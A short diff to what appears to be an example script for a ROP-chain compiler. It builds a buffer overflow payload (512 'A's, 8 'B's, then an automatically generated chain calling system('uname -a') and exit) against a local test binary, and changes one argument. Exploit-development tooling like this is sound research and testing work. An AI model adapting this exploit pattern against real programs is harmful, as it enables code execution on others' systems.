@@ -5,7 +5,7 @@ from rop_compiler import ropme, goal
 filename = './bof_system2'
 
 print "Using automatically built ROP chain"
-files = [(filename, None, 0)]
+files = [(filename, None, None)]
 rop = ropme.rop(files, [], [["function", "system", "uname -a\x00"], ["function", "exit", 33]], log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
